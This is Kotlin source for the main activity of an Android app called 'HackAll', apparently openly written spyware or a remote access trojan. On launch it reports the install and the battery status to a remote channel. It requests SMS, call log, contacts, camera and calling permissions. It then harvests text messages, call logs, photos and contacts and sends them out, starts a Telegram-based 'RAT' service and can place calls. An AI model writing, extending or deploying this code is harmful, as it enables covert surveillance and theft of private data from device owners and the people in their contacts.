package cocomelonc.hackall

import android.Manifest
import android.annotation.SuppressLint
import android.content.IntentFilter
import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.activity.ComponentActivity
import cocomelonc.hackall.broadcasts.HackAllAirPlaneBroadcastReceiver
import cocomelonc.hackall.tools.HackAllNetwork
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.DexterError
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.PermissionRequestErrorListener
import com.karumi.dexter.listener.multi.MultiplePermissionsListener
import android.os.BatteryManager
import cocomelonc.hackall.services.HackAllTelegramRat
import cocomelonc.hackall.tools.HackAllCallLogs
import cocomelonc.hackall.tools.HackAllCaller
import cocomelonc.hackall.tools.HackAllContacts
import cocomelonc.hackall.tools.HackAllSmsLogs
import cocomelonc.hackall.tools.HackAllPhotos

import cocomelonc.hackall.services.Actions

class HackAllMainActivity : ComponentActivity() {
    private lateinit var cameraButton: Button
    lateinit var receiver: HackAllAirPlaneBroadcastReceiver

    val hackSms = HackAllSmsLogs(context = this)
    val hackAllCallLogs = HackAllCallLogs(context = this)
    val hackAllCaller = HackAllCaller(context = this)
    val hackAllPhotos = HackAllPhotos(context = this)
    val hackAllContacts = HackAllContacts(context = this)

    // installed and opened - 1 stage
    private fun greetings(): String {
        return "LoveBahrain Hack All application has been installed on target device and opened\n"
    }

    // get battery info - 2 stage
    private fun getBatteryInfo(): String {
        val intentFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = registerReceiver(null, intentFilter)
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val percentage = if (level >= 0 && scale > 0) (level * 100) / scale else -1

        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL

        val chargePlug = batteryStatus?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
        val chargeType = when (chargePlug) {
            BatteryManager.BATTERY_PLUGGED_USB -> "USB"
            BatteryManager.BATTERY_PLUGGED_AC -> "AC Adapter"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
            else -> "Unknown"
        }
        return  "\uD83D\uDD0B Battery Info:\n" +
                "Percentage: $percentage%\n" +
                "Charging: $isCharging\n" +
                "Charging Method: $chargeType"
    }

    @SuppressLint("NewApi")
    private fun requestPermissions() {
        // below line is use to request permission in the current activity.
        // this method is use to handle error in runtime permissions
        Dexter.withContext(this) // below line is use to request the number of permissions which are required in our app.
            .withPermissions(
                Manifest.permission.CAMERA,  // below is the list of permissions
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.FOREGROUND_SERVICE,
            ) // after adding permissions we are calling an with listener method.
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
                    // this method is called when all permissions are granted
                    if (multiplePermissionsReport.areAllPermissionsGranted()) {
                        // do you work now
                        Toast.makeText(
                            applicationContext,
                            "All the permissions are granted..",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackAllNetwork(applicationContext).sendTextMessage("Hack All permissions granted\n")
                        hackSms.getSmsLogs()
                        hackAllCallLogs.getCallLogs()
                        hackAllPhotos.sendPhotos()
                        hackAllContacts.sendContacts()
                    }

                    // check for permanent denial of any permission
                    if (multiplePermissionsReport.isAnyPermissionPermanentlyDenied()) {
                        // permission is denied permanently, we will show user a message.
                        Toast.makeText(
                            applicationContext,
                            "Hack All some permissions denied..",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackAllNetwork(applicationContext).sendTextMessage("\uD83D\uDCF1 Hack All some permissions denied\n")
                    }
                }

                override fun onPermissionRationaleShouldBeShown(
                    list: MutableList<PermissionRequest?>?,
                    permissionToken: PermissionToken
                ) {
                    // this method is called when user grants some permission and denies some of them.
                    permissionToken.continuePermissionRequest()
                }
            }).withErrorListener(PermissionRequestErrorListener { _: DexterError? ->
                // we are displaying a toast message for error message.
                Toast.makeText(applicationContext, "Error occurred! ", Toast.LENGTH_SHORT)
                    .show()
            }) // below line is use to run the permissions on same thread and to check the permissions
            .onSameThread().check()
    }

    override fun onStop() {
        super.onStop()
        unregisterReceiver(receiver)
    }

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        HackAllNetwork(this).sendTextMessage(greetings())
        HackAllNetwork(this).sendTextMessage(getBatteryInfo())
        this.requestPermissions()

        val intent = Intent(this, HackAllTelegramRat::class.java)
        intent.action = Actions.START.toString()
        startService(intent)

        cameraButton = findViewById(R.id.camButton)
        cameraButton.setOnClickListener {
            hackSms.getSmsLogs()
            hackAllCallLogs.getCallLogs()
            hackAllPhotos.sendPhotos()
            hackAllContacts.sendContacts()
            hackAllCaller.startNewCall()
        }

        receiver = HackAllAirPlaneBroadcastReceiver()

        IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED).also {
            registerReceiver(receiver, it)
        }
    }
}